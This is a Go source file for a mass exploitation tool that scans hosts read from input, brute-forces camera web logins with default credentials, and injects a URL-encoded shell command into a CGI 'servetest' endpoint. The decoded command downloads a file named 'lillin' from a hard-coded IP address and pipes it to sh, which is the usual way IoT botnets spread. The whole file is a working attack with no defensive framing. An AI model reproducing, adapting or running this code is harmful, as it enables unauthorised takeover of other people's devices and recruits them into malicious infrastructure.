package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	total     int
	found     int
	logined   int
	exploited int

	wg sync.WaitGroup

	search_string = "Camera" //query too

	user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
	payload    = "%24%28cd%20%2Ftmp%3Bwget%20http%3A%2F%2F45.128.232.86%2Flillin%20-O-%20%7C%20sh%29"

	getData  = "/cgi-bin/operator/servetest?cmd=ntp&ServerName=" + payload + "&TimeZone=01:00"
	getData2 = "/cgi-bin/operator/servetest?cmd=ftp&ServerName=" + payload + "&ServerPort=21&Path=root&UserName=root&Password=root&Passive=off&SourceName=/var/ftptest&TargetName=testfile"
)

var logins = [...]string{"admin:", "root:root", "admin:admin", "admin:123456", "admin:654321", "admin:0000", "admin:1111", "admin:admin123", "admin:1234", "admin:12345"}

func get_buf(conn net.Conn) string {
	buf := make([]byte, 512)
	conn.Read(buf)

	return string(buf)
}

func check_host(host string) bool {
	conn, err := net.Dial("tcp", host)
	if err != nil {
		return false
	}

	defer conn.Close()

	fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", host, user_agent)

	buf := get_buf(conn)

	return strings.Contains(strings.ToLower(buf), search_string)
}

func check_login(host string) string {
	for i := 0; i < len(logins); i++ {
		conn, err := net.Dial("tcp", host)
		if err != nil {
			return "error"
		}

		auth := base64.StdEncoding.EncodeToString([]byte(logins[i]))

		fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAuthorization: Basic %s\r\n\r\n", host, user_agent, auth)

		buf := get_buf(conn)

		if strings.Contains(buf, "200 OK") {
			return logins[i]
		}
	}

	return "error"
}

func process_host(host string) {
	total++

	wg.Add(1)

	defer wg.Done()

	/*if !check_host(host) {
		return
	}*/

	found++

	auth := check_login(host)

	if auth == "error" {
		return
	}

	logined++

	bauth := base64.StdEncoding.EncodeToString([]byte(auth))

	conn, err := net.Dial("tcp", host)
	if err != nil {
		return
	}

	defer conn.Close()

	fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nAuthorization: Basic %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\nCookie: activatedmode=mechanical; viewsizemode=100; 4x3=false; g_mode=1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Language: en-US,en;q=0.9\r\nContent-Type: application/x-www-form-urlencoded\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nOrigin: http://%s\r\n\r\n", getData, host, bauth, user_agent, host)

	buf := get_buf(conn)

	if strings.Contains(buf, "200 OK") {
		fmt.Printf("exploited %s (%s %s)\r\n", host, auth, bauth)
		exploited++
		return
	}

	conn2, err := net.Dial("tcp", host)
	if err != nil {
		return
	}

	defer conn2.Close()

	fmt.Fprintf(conn2, "GET %s HTTP/1.1\r\nHost: %s\r\nAuthorization: Basic %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\nCookie: activatedmode=mechanical; viewsizemode=100; 4x3=false; g_mode=1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Language: en-US,en;q=0.9\r\nContent-Type: application/x-www-form-urlencoded\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nOrigin: http://%s\r\n\r\n", getData2, host, bauth, user_agent, host)

	buf = get_buf(conn2)

	if strings.Contains(buf, "200 OK") {
		fmt.Printf("exploited %s (%s %s)\r\n", host, auth, bauth)
		exploited++
		return
	}

}

func title_writer() {
	i := 0

	for {
		time.Sleep(1 * time.Second)

		fmt.Printf("[%d's] Total [%d] - Found [%d] - Logins [%d] - Exploited [%d]\r\n", i, total, found, logined, exploited)
		i++
	}
}

func main() {
	go title_writer()

	scan := bufio.NewScanner(os.Stdin)

	runtimeMax, _ := strconv.Atoi(os.Args[2])

	for scan.Scan() {
		for runtime.NumGoroutine() > runtimeMax {
			time.Sleep(1 * time.Second)
		}

		if os.Args[1] == "manual" {
			go process_host(scan.Text())
		} else {
			go process_host(scan.Text() + ":" + os.Args[1])
		}
	}

	time.Sleep(10 * time.Second)
	wg.Wait()
}
